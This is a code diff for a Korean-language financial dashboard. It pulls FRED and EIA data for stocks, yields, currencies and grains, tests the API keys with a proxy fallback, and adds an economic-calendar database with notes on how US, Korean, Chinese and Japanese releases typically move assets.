+    if(dt&&dt.length>=2){const c=parseFloat(dt[0].value),p=parseFloat(dt[1].value);document.getElementById('t10y-price').textContent=c.toFixed(2);updateNav('t10y',c,p,'%',2);document.getElementById('sp500-t10y').textContent=c.toFixed(2)+'%';live++}
+    const da=await fetchFRED('DEXUSAL',10);
+    if(da&&da.length>=2){const c=parseFloat(da[0].value),p=parseFloat(da[1].value);document.getElementById('aud-price').textContent=c.toFixed(4);updateNav('aud',c,p,'',4);live++}
+    const dy=await fetchFRED('PSOYBUSDM',6);
+    if(dy&&dy.length>=2){const c=parseFloat(dy[0].value),p=parseFloat(dy[1].value);document.getElementById('soy-price').textContent=c.toFixed(0);updateNav('soy',c,p,'mt',0);live++}
+    // ── 신규 5개 자산 FRED 연동 ──
+    const dn=await fetchFRED('NASDAQCOM',10);
+    if(dn&&dn.length>=2){const c=parseFloat(dn[0].value),p=parseFloat(dn[1].value);document.getElementById('nasdaq-price').textContent=c.toLocaleString();updateNav('nasdaq',c,p,'',0);live++}
+    const de=await fetchFRED('DEXUSEU',10);
+    if(de&&de.length>=2){const c=parseFloat(de[0].value),p=parseFloat(de[1].value);document.getElementById('eurofx-price').textContent=c.toFixed(4);updateNav('eurofx',c,p,'',4);live++}
+    const dj=await fetchFRED('DEXJPUS',10);
+    if(dj&&dj.length>=2){const c=parseFloat(dj[0].value),p=parseFloat(dj[1].value);document.getElementById('jpy-price').textContent=c.toFixed(1);updateNav('jpy',c,p,'',1);live++}
+    const dc=await fetchFRED('PMAIZMTUSDM',6);
+    if(dc&&dc.length>=2){const c=parseFloat(dc[0].value),p=parseFloat(dc[1].value);document.getElementById('corn-price').textContent=c.toFixed(0);updateNav('corn',c,p,'mt',0);live++}
+    const dw=await fetchFRED('PWHEAMTUSDM',6);
+    if(dw&&dw.length>=2){const c=parseFloat(dw[0].value),p=parseFloat(dw[1].value);document.getElementById('wheat-price').textContent=c.toFixed(0);updateNav('wheat',c,p,'mt',0);live++}
+  }
+  buildAllCharts(curAsset);
+  updateHeadlineDate();
+  if(live>0){
+    setStatus('',`실시간 · ${live}개 소스 연결`);
+    document.getElementById('notice-fallback').classList.remove('show');
+  } else {
+    // 키는 있지만 API 응답 실패 → 상세 안내
+    setStatus('error','API 응답 없음 — 콘솔(F12) 확인');
+    document.getElementById('notice-fallback').classList.add('show');
+    console.warn('모든 API 응답 실패. 키 확인 또는 CORS 이슈일 수 있습니다.');
+  }
+}
+function applyOilFB(){document.getElementById('oil-price').textContent=FB.oil.v.toFixed(2);updateNav('oil',FB.oil.v,FB.oil.p,'bbl',2);}
+
+// ═══ API 진단 ═══
+async function diagAPI(){
+  const eiaKey=getKey('EIA');
+  const fredKey=getKey('FRED');
+  let msg = '═══ API 진단 결과 ═══\n\n';
+  msg += `EIA 키: ${eiaKey ? '✅ 입력됨 (길이:'+eiaKey.length+')' : '❌ 없음'}\n`;
+  msg += `FRED 키: ${fredKey ? '✅ 입력됨 (길이:'+fredKey.length+')' : '❌ 없음'}\n\n`;
+
+  if(fredKey){
+    const fredUrl=`https://api.stlouisfed.org/fred/series/observations?series_id=SP500&api_key=${fredKey}&file_type=json&sort_order=desc&limit=2`;
+    // 직접 시도
+    let fredOk=false;
+    try{
+      const r=await fetch(fredUrl);const j=await r.json();
+      if(j?.observations?.length>0){msg+=`✅ FRED 직접 연결 성공! SP500: ${j.observations[0].value}\n`;fredOk=true;}
+      else if(j?.error_message){msg+=`❌ FRED 키 오류: ${j.error_message}\n`;}
+    }catch(e){}
+    // 프록시 시도
+    if(!fredOk){
+      msg+='FRED 직접 실패 → 프록시 시도 중...\n';
+      const proxies=[
+        ['allorigins',`https://api.allorigins.win/raw?url=${encodeURIComponent(fredUrl)}`],
+        ['corsproxy.io',`https://corsproxy.io/?${encodeURIComponent(fredUrl)}`]
+      ];
+      for(const [name,p] of proxies){
+        try{
+          const r=await fetch(p);const j=await r.json();
+          if(j?.observations?.length>0){msg+=`✅ FRED [${name}] 프록시 성공! SP500: ${j.observations[0].value}\n`;fredOk=true;break;}
+        }catch(e){msg+=`❌ [${name}] 실패\n`;}
+      }
+      if(!fredOk) msg+='→ 모든 방법 실패. Netlify 배포 후 사용 권장\n';
+    }
+  }
+
+  if(eiaKey){
+    msg+='\nEIA 연결 테스트 중...\n';
+    try{
+      const r=await fetch(`https://api.eia.gov/v2/seriesid/PET.RWTC.D?api_key=${eiaKey}&data[0]=value&sort[0][column]=period&sort[0][direction]=desc&offset=0&length=2&frequency=daily`);
+      const j=await r.json();
+      if(j?.response?.data?.length>0){msg+=`✅ EIA 연결 성공! WTI: ${j.response.data[0].value}\n`;}
+      else{msg+=`❌ EIA 오류: ${JSON.stringify(j).slice(0,100)}\n`;}
+    }catch(e){msg+=`❌ EIA 네트워크 오류: ${e.message}\n`;}
+  }
+
+  alert(msg);
+}
+
+// ═══ SEASON BAR GRADIENT ═══
+function applySeasonBarGradient(){
+  document.querySelectorAll('.sb-bar').forEach(bar=>{
+    const w=parseInt(bar.style.width)||0;
+    // 너비 비례 붉은 그라데이션: 넓을수록 진한 빨강, 좁을수록 연한 분홍
+    // w: 25~100 → 색상 매핑
+    const t=Math.max(0,Math.min(1,(w-25)/75)); // 0~1 정규화
+    const r=Math.round(220-t*0);   // R: 220 고정
+    const g=Math.round(160-t*110); // G: 160→50
+    const b=Math.round(160-t*110); // B: 160→50
+    bar.style.background=`rgb(${r},${g},${b})`;
+  });
+}
+// ═══ SOURCE LINKS ═══
+function addSourceLinks(){
+  const map={
+    'page-oil':    {label:'EIA STEO',          url:'https://www.eia.gov/outlooks/steo/',              alertLabel:'EIA STEO · 단기 에너지 전망',            alertUrl:'https://www.eia.gov/outlooks/steo/'},
+    'page-gas':    {label:'EIA 가스 주간',       url:'https://www.eia.gov/naturalgas/weekly/',          alertLabel:'EIA 천연가스 주간 보고서',                 alertUrl:'https://www.eia.gov/naturalgas/weekly/'},
+    'page-gold':   {label:'World Gold Council', url:'https://www.gold.org',                            alertLabel:'World Gold Council · 금 시장 동향',       alertUrl:'https://www.gold.org'},
+    'page-sp500':  {label:'FRED SP500',         url:'https://fred.stlouisfed.org',                    alertLabel:'FRED · S&P500 시계열',                    alertUrl:'https://fred.stlouisfed.org'},
+    'page-t10y':   {label:'FRED DGS10',         url:'https://fred.stlouisfed.org/series/DGS10',       alertLabel:'FRED DGS10 · 10년 국채 수익률',           alertUrl:'https://fred.stlouisfed.org/series/DGS10'},
+    'page-aud':    {label:'FRED DEXUSAL',       url:'https://fred.stlouisfed.org/series/DEXUSAL',     alertLabel:'FRED DEXUSAL · 호주달러 시계열',          alertUrl:'https://fred.stlouisfed.org/series/DEXUSAL'},
+    'page-soy':    {label:'USDA WASDE',         url:'https://www.usda.gov/oce/commodity/wasde/',      alertLabel:'USDA WASDE · 세계 농업 수급 전망',        alertUrl:'https://www.usda.gov/oce/commodity/wasde/'},
+    'page-nasdaq': {label:'FRED NASDAQCOM',     url:'https://fred.stlouisfed.org',                    alertLabel:'FRED NASDAQCOM · 나스닥 시계열',          alertUrl:'https://fred.stlouisfed.org'},
+    'page-eurofx': {label:'FRED DEXUSEU',       url:'https://fred.stlouisfed.org/series/DEXUSEU',     alertLabel:'FRED DEXUSEU · EUR/USD 시계열',           alertUrl:'https://fred.stlouisfed.org/series/DEXUSEU'},
+    'page-jpy':    {label:'FRED DEXJPUS',       url:'https://fred.stlouisfed.org/series/DEXJPUS',     alertLabel:'FRED DEXJPUS · USD/JPY 시계열',           alertUrl:'https://fred.stlouisfed.org/series/DEXJPUS'},
+    'page-corn':   {label:'USDA WASDE',         url:'https://www.usda.gov/oce/commodity/wasde/',      alertLabel:'USDA WASDE · 세계 농업 수급 전망',        alertUrl:'https://www.usda.gov/oce/commodity/wasde/'},
+    'page-wheat':  {label:'USDA WASDE',         url:'https://www.usda.gov/oce/commodity/wasde/',      alertLabel:'USDA WASDE · 세계 농업 수급 전망',        alertUrl:'https://www.usda.gov/oce/commodity/wasde/'}
+  };
+  Object.entries(map).forEach(([pid,src])=>{
+    const page=document.getElementById(pid);
+    if(!page)return;
+
+    // factor-impact + cal-impact 출처 링크
+    const mkLink=()=>{const a=document.createElement('a');a.href=src.url;a.target='_blank';a.className='fi-link';a.textContent=src.label+' →';return a;};
+    page.querySelectorAll('.factor-impact').forEach(el=>{if(!el.querySelector('.fi-link'))el.appendChild(mkLink());});
+    page.querySelectorAll('.cal-impact').forEach(el=>{if(!el.querySelector('.fi-link'))el.appendChild(mkLink());});
+
+    // alert-banner 출처 링크 (하단)
+    const banner=page.querySelector('.alert-banner');
+    if(banner&&!banner.querySelector('.alert-src')){
+      // alert-text를 inner wrapper로 감싸기
+      const textEl=banner.querySelector('.alert-text');
+      if(textEl){
+        let inner=banner.querySelector('.alert-banner-inner');
+        if(!inner){
+          inner=document.createElement('div');
+          inner.className='alert-banner-inner';
+          banner.insertBefore(inner,textEl);
+          inner.appendChild(textEl);
+        }
+        const srcDiv=document.createElement('span');
+        srcDiv.className='alert-src';
+        srcDiv.innerHTML='출처: <a href="'+src.alertUrl+'" target="_blank">'+src.alertLabel+' →</a>';
+        inner.appendChild(srcDiv);
+      }
+    }
+  });
+}
+
+window.addEventListener('DOMContentLoaded',()=>{
+  // 1. 폴백 데이터 즉시 적용
+  applyFallback();
+
+  // 2. 차트·그라데이션·링크 — API와 완전 분리해서 즉시 실행
+  setTimeout(()=>{
+    try { buildAllCharts('oil'); } catch(e){ console.warn('chart error',e); }
+    try { applySeasonBarGradient(); } catch(e){ console.warn('gradient error',e); }
+    try { addSourceLinks(); } catch(e){ console.warn('links error',e); }
+  }, 150);
+
+  // 3. 거시 지표 스트립 — 실패해도 다른 기능에 영향 없도록 완전 격리
+  setTimeout(()=>{
+    loadMacroStrip().catch(e=>console.warn('macro strip skipped:',e));
+  }, 500);
+
+  // 4. 셋업 오버레이 처리
+  document.getElementById('setup-overlay').style.display='none';
+  document.getElementById('notice-fallback').classList.add('show');
+  startCountdown();
+
+  // 5. API 키 있으면 실시간 로드
+  if(getKey('EIA')||getKey('FRED')){
+    loadAllData().catch(e=>console.warn('API load error:',e));
+  }
+});
+
+
+// ═══════════════════════════════════════════════════
+// ECONOMIC CALENDAR + COUNTDOWN ENGINE v6
+// ★ 자산별 영향 가이드 포함
+// ★ 시간 KST 기준 / actual='' 이면 카운트다운 대상
+// ═══════════════════════════════════════════════════
+
+// ─── 자산별 영향 가이드 DB ───
+// guide_key 로 이벤트와 연결
+var EVENT_GUIDES = {
+
+  // 미국
+  'nfp': {
+    desc: '매월 첫째 금요일 발표. 미국 고용시장의 건강 상태를 가장 직접적으로 보여주는 지표로, Fed 금리 정책의 핵심 판단 근거. 서프라이즈 시 외환·채권·주식 전 자산에 동시 충격.',
+    assets: [
+      {name:'달러(DXY)',  up:'▲ 강세',    down:'▼ 약세'},
+      {name:'금',         up:'▼ 하락 압력', down:'▲ 상승'},
+      {name:'S&P 500',    up:'혼조',        down:'▼ 하락'},
+      {name:'나스닥',     up:'혼조',        down:'▼ 하락'},
+      {name:'10년 금리',  up:'▲ 상승',     down:'▼ 하락'},
+      {name:'WTI 원유',   up:'간접↑',      down:'간접↓'},
+    ],
+    note: '고용이 강할수록 Fed 금리 인하 기대가 후퇴해 달러·금리 상승, 금·채권 하락 압력. 단, 경기 낙관으로 주식은 혼조 반응이 일반적. 예상 대비 크게 상회하면 "금리 동결 장기화" 우려로 성장주에 악재.'
+  },
+
+  'adp': {
+    desc: 'NFP 이틀 전 발표되는 민간 고용 선행 지표. 실제 NFP와 괴리가 크지만 방향성 힌트로 활용. 단독으로는 반응 제한적, NFP 전 포지션 조정 참고용.',
+    assets: [
+      {name:'달러(DXY)',  up:'▲ 소폭 강세', down:'▼ 소폭 약세'},
+      {name:'금',         up:'▼ 소폭 하락',  down:'▲ 소폭 상승'},
+      {name:'S&P 500',    up:'중립~소폭 ↑', down:'중립~소폭 ↓'},
+      {name:'10년 금리',  up:'▲ 소폭 상승', down:'▼ 소폭 하락'},
+    ],
+    note: 'NFP의 선행 지표로 활용되지만 상관관계가 낮아 시장 반응은 제한적. 주로 NFP 방향성 가늠용으로 참고. 단독으로 큰 방향을 바꾸기보단 기존 분위기를 강화하는 역할.'
+  },
+
+  'cpi': {
+    desc: '소비자 물가 상승률. Fed가 가장 중시하는 인플레이션 척도 중 하나. 2% 목표 대비 수치에 따라 금리 인하·동결·인상 기대가 즉각 반응. 나스닥 변동성이 가장 큼.',
+    assets: [
+      {name:'달러(DXY)',  up:'▲ 강세',     down:'▼ 약세'},
+      {name:'금',         up:'▼ 하락',      down:'▲ 상승'},
+      {name:'S&P 500',    up:'▼ 하락',      down:'▲ 상승'},
+      {name:'나스닥',     up:'▼ 하락(성장주 타격)', down:'▲ 상승'},
+      {name:'10년 금리',  up:'▲ 상승',     down:'▼ 하락'},
+      {name:'WTI 원유',   up:'복합 영향',   down:'▼ 수요 우려'},
+    ],
+    note: '예상보다 높은 CPI는 인플레이션 지속 신호로 금리 인하 기대를 꺾어 성장주·채권에 악재. 반대로 낮은 CPI는 인하 기대 강화로 증시·채권 강세. 특히 나스닥은 금리 민감도가 높아 변동성이 가장 큼.'
+  },
+
+  'ppi': {
+    desc: '생산자(기업) 단계의 물가 압력 측정. CPI에 1~3개월 선행하는 특성. 기업 마진 압박 → 소비자가격 전가 여부 판단에 활용. CPI 전날 발표로 예고 효과.',
+    assets: [
+      {name:'달러(DXY)',  up:'▲ 소폭 강세', down:'▼ 소폭 약세'},
+      {name:'금',         up:'▼ 하락',       down:'▲ 상승'},
+      {name:'S&P 500',    up:'▼ 소폭 하락',  down:'▲ 소폭 상승'},
+      {name:'10년 금리',  up:'▲ 상승',      down:'▼ 하락'},
+    ],
+    note: 'PPI는 생산자 물가로 CPI의 선행 지표 역할. 예상 상회 시 향후 소비자 물가 상승 우려로 시장 반응. CPI보다 영향 강도는 작지만 인플레이션 흐름 판단의 중요 데이터.'
+  },
+
+  'fomc': {
+    desc: '연간 8회 개최. 기준금리 결정 + 점도표 + 파월 기자회견의 3중 이벤트. 금리 방향보다 "향후 경로" 시사가 더 중요. 발표 전후 전 자산 변동성 극대화.',
+    assets: [
+      {name:'달러(DXY)',  up:'▲ 강세(매파)', down:'▼ 약세(비둘기)'},
+      {name:'금',         up:'▼ 하락',         down:'▲ 상승'},
+      {name:'S&P 500',    up:'▼ 하락',         down:'▲ 상승'},
+      {name:'나스닥',     up:'▼ 하락(금리민감)', down:'▲ 상승'},
+      {name:'10년 금리',  up:'▲ 상승',         down:'▼ 하락'},
+      {name:'WTI 원유',   up:'▼ 수요 우려',    down:'▲ 수요 기대'},
+    ],
+    note: '금리 동결·인하 여부보다 향후 경로(점도표·파월 발언)가 더 중요. "매파적 동결"이면 주식 하락, "비둘기적 동결"이면 상승. 발표 직후 변동성이 매우 크며 보통 파월 기자회견이 실제 방향을 결정.'
+  },
+
+  'gdp': {
+    desc: '미국 경제성장률. 속보치→예비치→확정치 순 발표. 강한 성장은 기업이익 기대로 주식 강세이나, 과열 시 금리 인상 우려도 동반. 경기 사이클 전환 판단의 기준.',
+    assets: [
+      {name:'달러(DXY)',  up:'▲ 강세',      down:'▼ 약세'},
+      {name:'금',         up:'중립~소폭 ↓', down:'▲ 안전자산'},
+      {name:'S&P 500',    up:'▲ 상승',       down:'▼ 하락'},
+      {name:'10년 금리',  up:'▲ 상승',       down:'▼ 하락'},
+      {name:'WTI 원유',   up:'▲ 수요 기대',  down:'▼ 수요 우려'},
+    ],
+    note: '경제성장 속도를 나타내는 핵심 지표. 강한 GDP는 소비·기업이익 증가 기대로 주식·달러 강세. 단 성장이 너무 강하면 "과열 → 추가 금리 인상" 우려로 채권에는 악재. 속보치 → 예비치 → 확정치 순서로 발표.'
+  },
+
+  'pce': {
+    desc: 'Fed 공식 인플레이션 목표 지표. CPI보다 소비 행동 변화를 더 정교하게 반영. 근원 PCE(식품·에너지 제외)가 핵심. FOMC 전 마지막 주요 데이터로 금리 경로를 확인.',
+    assets: [
+      {name:'달러(DXY)',  up:'▲ 강세',    down:'▼ 약세'},
+      {name:'금',         up:'▼ 하락',     down:'▲ 상승'},
+      {name:'S&P 500',    up:'▼ 하락',     down:'▲ 상승'},
+      {name:'10년 금리',  up:'▲ 상승',    down:'▼ 하락'},
+    ],
+    note: 'Fed가 공식 인플레이션 목표로 삼는 지표로 CPI보다 더 중요. 근원 PCE(식품·에너지 제외)가 핵심. 2% 목표를 지속 상회하면 금리 인하 기대가 꺾임. 시장 반응 강도는 CPI와 비슷하거나 더 큼.'
+  },
+
+  'retail': {
+    desc: '미국 소비 동향의 월간 스냅샷. GDP의 70%가 소비로 구성. 강한 소비는 경기 낙관 신호이지만, 과열 시 인플레이션 재점화 우려로 복합 반응 가능.',
+    assets: [
+      {name:'달러(DXY)',  up:'▲ 강세',    down:'▼ 약세'},
+      {name:'S&P 500',    up:'▲ 상승',     down:'▼ 하락'},
+      {name:'WTI 원유',   up:'▲ 수요 기대', down:'▼ 수요 우려'},
+      {name:'10년 금리',  up:'▲ 소폭 상승', down:'▼ 소폭 하락'},
+    ],
+    note: '미국 소비 동향을 나타내는 핵심 지표. 미국 GDP의 70%가 소비로 구성. 강한 소매판매는 경기 낙관 → 주식·달러 강세. 단 소비 과열이 인플레이션 우려로 이어지면 채권에는 복합 반응.'
+  },
+
+  'ism_mfg': {
+    desc: '매월 1일 발표되는 제조업 경기 지수. 50 기준선이 핵심 — 이상이면 확장, 이하면 수축. 신규 주문 세부항목이 향후 생산 방향의 선행 지표.',
+    assets: [
+      {name:'달러(DXY)',  up:'▲ 강세',    down:'▼ 약세'},
+      {name:'S&P 500',    up:'▲ 상승',     down:'▼ 하락'},
+      {name:'WTI 원유',   up:'▲ 수요 기대', down:'▼ 수요 우려'},
+      {name:'10년 금리',  up:'▲ 소폭 상승', down:'▼ 소폭 하락'},
+    ],
+    note: '50 기준선이 핵심. 50 이상이면 제조업 확장, 이하면 수축. 특히 신규 주문 세부항목이 선행성이 강함. 시장 반응은 CPI·NFP보다 약하지만 경기 방향성 판단에 중요한 지표.'
+  },
+
+  'sp_pmi': {
+    desc: '민간 조사 기반 제조업·서비스업 경기 지수. ISM과 달리 글로벌 비교 가능. 예비치(월말)→확정치(월초) 순 발표. 50 기준선 기준으로 경기 방향 판단.',
+    assets: [
+      {name:'달러(DXY)',  up:'▲ 소폭 강세', down:'▼ 소폭 약세'},
+      {name:'S&P 500',    up:'▲ 소폭 상승', down:'▼ 소폭 하락'},
+      {name:'10년 금리',  up:'▲ 소폭 상승', down:'▼ 소폭 하락'},
+    ],
+    note: 'ISM PMI와 유사하지만 글로벌 비교가 가능한 민간 조사 지표. 예비치(월말)와 확정치(월초) 두 번 발표. 시장 반응은 ISM보다 다소 약한 편.'
+  },
+
+  'jobless': {
+    desc: '매주 목요일 발표되는 주간 고용 지표. 4주 이동평균으로 추세 확인이 중요. 급증 시 고용 악화 신호로 Fed 금리 인하 기대 강화. NFP의 주간 선행 참고 지표.',
+    assets: [
+      {name:'달러(DXY)',  up:'▼ 약세(고용 악화)', down:'▲ 강세'},
+      {name:'금',         up:'▲ 상승',             down:'▼ 하락'},
+      {name:'S&P 500',    up:'▼ 하락',             down:'▲ 상승'},
+      {name:'10년 금리',  up:'▼ 하락',             down:'▲ 상승'},
+    ],
+    note: '주간 데이터라 개별 주는 노이즈 많음. 4주 이동평균으로 추세 확인이 중요. 연속 청구 건수와 함께 보면 고용시장 둔화 여부를 더 정확히 파악 가능.'
+  },
+
+  'eia_oil': {
+    desc: '매주 수요일 미 에너지부(EIA) 발표. 재고 증가는 공급 과잉으로 유가 하락, 감소는 수요 강세로 상승 압력. 계절적 패턴이 강해 5년 평균 대비 증감이 핵심.',
+    assets: [
+      {name:'WTI 원유',  up:'▼ 하락 압력(공급↑)', down:'▲ 상승(공급↓)'},
+      {name:'달러(DXY)', up:'간접 영향',            down:'간접 영향'},
+      {name:'에너지주',  up:'▼ 하락',               down:'▲ 상승'},
+    ],
+    note: '미국 원유 재고 증가는 공급 과잉 신호로 WTI 하락 압력. 감소는 수요 강세 신호로 상승 요인. 단 계절성이 강해 5년 평균 대비 변화량이 더 중요. 허리케인·정제시설 가동률도 함께 체크.'
+  },
+
+  'durable': {
+    desc: '항공기 제외 핵심 자본재 주문이 기업 투자 동향의 선행 지표. 항공기 수주는 월별 변동성이 커 왜곡 가능. 제조업 설비투자 방향성 확인에 활용.',
+    assets: [
+      {name:'달러(DXY)',  up:'▲ 소폭 강세', down:'▼ 소폭 약세'},
+      {name:'S&P 500',    up:'▲ 소폭 상승', down:'▼ 소폭 하락'},
+      {name:'10년 금리',  up:'▲ 소폭 상승', down:'▼ 소폭 하락'},
+    ],
+    note: '항공기 제외 핵심 자본재 주문이 기업 투자의 선행 지표. 항공기 수주는 월별 변동이 커 전체 수치를 왜곡하므로 "항공기 제외" 수치를 중심으로 해석.'
+  },
+
+  'housing': {
+    desc: '주택 건설 착공 건수. 건설·가구·가전 등 연관 산업 파급효과가 크며 경기 선행 지표 역할. 모기지 금리에 민감해 Fed 정책 영향을 즉각 반영하는 지표.',
+    assets: [
+      {name:'달러(DXY)',  up:'▲ 소폭 강세', down:'▼ 소폭 약세'},
+      {name:'S&P 500',    up:'▲ 소폭 상승', down:'▼ 소폭 하락'},
+      {name:'10년 금리',  up:'▲ 소폭 상승', down:'▼ 소폭 하락'},
+    ],
+    note: '주택 경기는 건설·가구·가전 등 연관 산업 파급 효과가 큼. 금리에 민감하게 반응. 높은 모기지 금리 환경에서 하회 시 경기 둔화 신호로 해석될 수 있음.'
+  },
+
+  // 한국
+  'bok_rate': {
+    desc: '한국은행 연 8회 기준금리 결정. 한미 금리차가 원/달러 환율의 핵심 변수. 미 Fed 동향과 국내 경기·물가를 종합 판단. 인하 시 채권·주식 강세, 원화 약세 경향.',
+    assets: [
+      {name:'원/달러(USD/KRW)', up:'▼ 원화 강세(인하)', down:'▲ 원화 약세(동결)'},
+      {name:'코스피',           up:'▲ 상승(인하)',       down:'▼ 하락(동결·인상)'},
+      {name:'국내 국채금리',    up:'▼ 하락(인하)',       down:'▲ 상승(동결·인상)'},
+      {name:'AUD/USD',          up:'간접 영향',          down:'간접 영향'},
+    ],
+    note: '여기서 "상회"는 시장 예상보다 더 비둘기적(인하 또는 인하 시사), "하회"는 더 매파적(동결 또는 인상 시사)으로 해석. 파월 등 미 Fed 영향을 크게 받으며 한미 금리차도 원/달러에 중요한 변수.'
+  },
+
+  'kr_cpi': {
+    desc: '한국 소비자물가지수. 에너지·식품 수입 의존도가 높아 원화·유가 변동에 민감. 목표치(2%) 대비 수치로 한국은행 금리 경로 판단. 매월 초 발표.',
+    assets: [
+      {name:'원/달러(USD/KRW)', up:'▲ 원화 약세', down:'▼ 원화 강세'},
+      {name:'코스피',           up:'▼ 하락 압력', down:'▲ 상승'},
+      {name:'국내 국채금리',    up:'▲ 상승',      down:'▼ 하락'},
+    ],
+    note: '한국 소비자물가. 목표치(2%)를 지속 상회하면 한국은행 금리 인하 지연 신호. 에너지·식품 가격에 민감하며, 원화 약세(수입물가 상승)가 CPI 상방 압력으로 작용.'
+  },
+
+  // 중국
+  'cn_gdp': {
+    desc: '세계 2위 경제국의 성장률. 글로벌 원자재 수요와 직결되어 철광석·구리·유가에 즉각 영향. 호주달러(AUD)는 중국 GDP의 대리 지표로 불릴 만큼 연동성이 높음.',
+    assets: [
+      {name:'원자재(철광석·구리)', up:'▲ 상승',         down:'▼ 하락'},
+      {name:'WTI 원유',            up:'▲ 수요 기대',    down:'▼ 수요 우려'},
+      {name:'AUD/USD',             up:'▲ 상승(중국 연동)', down:'▼ 하락'},
+      {name:'달러(DXY)',           up:'▼ 위험선호 ↑',  down:'▲ 안전자산'},
+      {name:'S&P 500',             up:'▲ 글로벌 경기↑', down:'▼ 하락'},
+    ],
+    note: '세계 2위 경제국으로 글로벌 원자재·수출 수요에 직결. 강한 중국 성장은 호주·캐나다 등 원자재 수출국 통화(AUD, CAD) 강세로 이어짐. 부동산 경기·소비 세부항목도 함께 확인 필수.'
+  },
+
+  'cn_pmi': {
+    desc: '중국 제조업 경기 선행 지표. 50 기준선 이상이면 확장. 국가통계국(대기업)과 차이신(중소기업) 두 가지를 함께 비교. 원자재·호주달러·글로벌 증시에 선행 신호.',
+    assets: [
+      {name:'원자재(철광석·구리)', up:'▲ 상승',         down:'▼ 하락'},
+      {name:'WTI 원유',            up:'▲ 수요 기대',    down:'▼ 수요 우려'},
+      {name:'AUD/USD',             up:'▲ 상승',         down:'▼ 하락'},
+    ],
+    note: '50 기준선이 핵심. 국가통계국 PMI(대기업 중심)와 차이신 PMI(중소기업 중심)를 함께 비교. 두 지수가 엇갈리면 경기 이중 구조를 의미. 제조업 PMI 약세는 원자재 수요 감소로 호주달러에 즉각 반영.'
+  },
+
+  'cn_trade': {
+    desc: '중국의 수출입 동향. 수출 강세는 글로벌 수요 견조 신호, 수입 강세는 중국 내수 회복 신호. 대미 흑자 규모는 무역분쟁 리스크 가늠자로도 활용.',
+    assets: [
+      {name:'달러/위안(USD/CNY)',  up:'복합',           down:'▼ 위안 약세'},
+      {name:'AUD/USD',             up:'▲ 수출 강세',   down:'▼ 하락'},
+      {name:'WTI 원유',            up:'▲ 수입 강세',   down:'▼ 수요 우려'},
+    ],
+    note: '수출 강세(무역흑자 확대)는 글로벌 수요 견조 신호, 수입 강세는 중국 내수 회복 신호로 해석. 대미 무역 흑자는 무역 분쟁 변수가 되기도 함.'
+  },
+
+  // 일본
+  'boj_rate': {
+    desc: '일본은행 연 8회 금리 결정. 엔화는 글로벌 캐리트레이드의 핵심 펀딩 통화로, BOJ 인상 시 전 세계 위험자산에 연쇄 청산 압력. 우에다 총재 발언이 결정적 변수.',
+    assets: [
+      {name:'USD/JPY',    up:'▼ 엔화 강세(인상)', down:'▲ 엔화 약세(동결)'},
+      {name:'닛케이225',  up:'▼ 하락(수출주 타격)', down:'▲ 상승'},
+      {name:'금',         up:'간접 영향',           down:'간접 영향'},
+      {name:'달러(DXY)',  up:'▼ 소폭 약세',         down:'▲ 소폭 강세'},
+    ],
+    note: '"상회"는 예상보다 더 매파적(인상 또는 추가 인상 시사), "하회"는 더 비둘기적(동결 또는 완화 지속). 엔화는 글로벌 캐리트레이드의 핵심 펀딩 통화로, BOJ 인상 시 전 세계 위험자산에 연쇄 영향. 우에다 총재 발언이 결정적.'
+  },
+
+  'jp_gdp': {
+    desc: '일본 경제성장률. 수출 의존도가 높아 엔화 환율 영향을 크게 받음. 강한 성장은 BOJ 금리 인상 기대 강화 → 엔화 강세로 이어지는 경로. 내수·설비투자 항목 주목.',
+    assets: [
+      {name:'USD/JPY',   up:'▼ 엔화 강세', down:'▲ 엔화 약세'},
+      {name:'닛케이225', up:'혼조',         down:'▼ 하락'},
+    ],
+    note: '일본 GDP는 수출 의존도가 높아 엔화 환율 영향을 크게 받음. 강한 성장은 BOJ 금리 인상 기대 강화 → 엔화 강세 경로로 이어질 수 있음. 내수·설비투자 세부항목 확인 필요.'
+  },
+};
+
+// ─── CAL_EVENTS ───
+var CAL_EVENTS = [
+  // ════════ 2026년 4월 (KST) ════════
+  {date:'2026-04-01',time:'21:15',country:'us',title:'ADP 비농업 취업자수 (3월)',prev:'77K',forecast:'120K',actual:'155K',impact:'예상 상회 — 달러 소폭 강세',guide:'adp'},
+  {date:'2026-04-01',time:'21:30',country:'us',title:'소매판매 (2월)',prev:'-0.9%',forecast:'0.2%',actual:'0.2%',impact:'예상 부합 — 소비 회복 확인',guide:'retail'},
+  {date:'2026-04-01',time:'22:45',country:'us',title:'S&P글로벌 제조업 PMI (3월)',prev:'52.7',forecast:'53.0',actual:'53.5',impact:'예상 상회 — 제조업 확장세 확인',guide:'sp_pmi'},
+  {date:'2026-04-01',time:'23:00',country:'us',title:'ISM 제조업 PMI (3월)',prev:'49.8',forecast:'50.2',actual:'50.8',impact:'기준선 회복 — 경기 확장 전환',guide:'ism_mfg'},
+  {date:'2026-04-01',time:'23:30',country:'us',title:'EIA 원유 재고',prev:'+6.9M',forecast:'-1.2M',actual:'+5.5M',impact:'예상 상회 증가 — 공급 과잉 우려',guide:'eia_oil'},
+  {date:'2026-04-02',time:'21:30',country:'us',title:'신규 실업수당 청구',prev:'224K',forecast:'225K',actual:'223K',impact:'예상 소폭 하회 — 고용 양호',guide:'jobless'},
+  {date:'2026-04-03',time:'21:30',country:'us',title:'비농업 취업자수 NFP (3월)',prev:'151K',forecast:'140K',actual:'228K',impact:'대규모 서프라이즈 — 달러·금리 급등',guide:'nfp'},
+  {date:'2026-04-03',time:'21:30',country:'us',title:'실업률 (3월)',prev:'4.1%',forecast:'4.1%',actual:'4.2%',impact:'소폭 상승 — 고용 혼조',guide:'nfp'},
+  {date:'2026-04-03',time:'22:45',country:'us',title:'S&P글로벌 서비스 PMI (3월)',prev:'51.0',forecast:'51.5',actual:'54.4',impact:'예상 큰 폭 상회 — 서비스업 강세',guide:'sp_pmi'},
+  {date:'2026-04-07',time:'08:00',country:'cn',title:'차이신 서비스 PMI (3월)',prev:'51.4',forecast:'51.8',actual:'',impact:'',guide:'cn_pmi'},
+  {date:'2026-04-07',time:'09:00',country:'kr',title:'소비자물가 CPI (3월)',prev:'2.1%',forecast:'2.0%',actual:'',impact:'',guide:'kr_cpi'},
+  {date:'2026-04-08',time:'21:30',country:'us',title:'생산자물가 PPI (3월)',prev:'3.2%',forecast:'3.3%',actual:'',impact:'',guide:'ppi'},
+  {date:'2026-04-09',time:'21:30',country:'us',title:'소비자물가 CPI (3월)',prev:'2.8%',forecast:'2.7%',actual:'',impact:'',guide:'cpi'},
